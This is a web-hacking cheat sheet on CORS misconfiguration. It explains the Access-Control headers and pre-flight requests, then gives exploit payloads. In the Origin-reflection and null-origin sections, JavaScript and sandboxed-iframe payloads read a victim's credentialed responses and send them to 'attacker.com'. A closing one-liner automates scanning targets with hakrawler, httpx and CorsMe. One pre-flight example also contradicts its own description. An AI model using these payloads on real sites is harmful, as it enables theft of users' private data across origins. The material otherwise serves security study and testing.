# CORS - Misconfigurations & Bypass
Cross-Origin Resource Sharing (CORS) standard enables servers to define who can access their assets and which HTTP request methods are permitted from external sources.

A same-origin policy mandates that a server requesting a resource and the server hosting the resource share the same `protocol` (e.g., http://), `domain name` (e.g., internal-web.com), and `port` (e.g., 80). Under this policy, only web pages from the same domain and port are allowed access to the resources.

![cors](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/9eee5927-fdb6-4fe2-8182-d669453230d1)





## `Access-Control-Allow-Origin` Header
This header can allow multiple origins, a `null` value, or a wildcard `*`. However, no browser supports multiple origins, and the use of the wildcard `*` is subject to limitations. (The wildcard must be used alone, and its use alongside `Access-Control-Allow-Credentials: true` is not permitted.)
This header is issued by a server in response to a cross-domain resource request initiated by a website, with the browser automatically adding an `Origin` header.

## `Access-Control-Allow-Credentials` Header
By default, cross-origin requests are made without credentials like cookies or the Authorization header. Yet, a cross-domain server can allow the reading of the response when credentials are sent by setting the `Access-Control-Allow-Credentials` header to `true`.
If set to true, the browser will transmit credentials (cookies, authorization headers, or TLS client certificates).


```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
        console.log(xhr.responseText);
    }
}
xhr.open('GET', 'http://example.com/', true); 
xhr.withCredentials = true; 
xhr.send(null);
```

```javascript
fetch(url, {
  credentials: 'include'  
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```


## CSRF Pre-flight request
When initiating a cross-domain request under specific conditions, such as using a non-standard HTTP method (anything other than `HEAD`, `GET`, `POST`), introducing new headers, or employing a special Content-Type header value, a pre-flight request may be required. This preliminary request, leveraging the 
`OPTIONS` method, serves to inform the server of the forthcoming cross-origin request's intentions, including the HTTP methods and headers it intends to use.

The Cross-Origin Resource Sharing (CORS) protocol mandates this pre-flight check to determine the feasibility of the requested cross-origin operation by verifying the allowed methods, headers, and the trustworthiness of the origin. For a detailed understanding of what conditions circumvent the need for a pre-flight request, refer to the comprehensive guide provided by [Mozilla Developer Network (MDN)](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests).

It's crucial to note that the absence of a pre-flight request does not negate the requirement for the response to carry authorization headers. Without these headers, the browser is incapacitated in its ability to process the response from the cross-origin request.
Consider the following illustration of a pre-flight request aimed at employing the `PUT` method along with a custom header named Special-Request-Header:

```html
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```

In response, the server might return headers indicating the accepted methods, the allowed origin, and other CORS policy details, as shown below:

```html
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```

## Reflection of `Origin` in `Access-Control-Allow-Origin`
```javascript
<script>
   var req = new XMLHttpRequest();
   req.onload = reqListener;
   req.open('get','https://example.com/details',true);
   req.withCredentials = true;
   req.send();
   function reqListener() {
       location='/log?key='+this.responseText;
   };
</script>
```

## Exploiting the `null` Origin

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://example/details',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
  var req = new XMLHttpRequest();
  req.onload = reqListener;
  req.open('get','https://example/details',true);
  req.withCredentials = true;
  req.send();
  function reqListener() {
    location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
  };
</script>"></iframe>
```


## Automate CORS
```bash
echo https://target.com | hakrawler | httpx -silent | CorsMe -header
```




## Tools
* [CorsMe](https://github.com/Shivangx01b/CorsMe)
* [hakrawler](https://github.com/hakluke/hakrawler)


























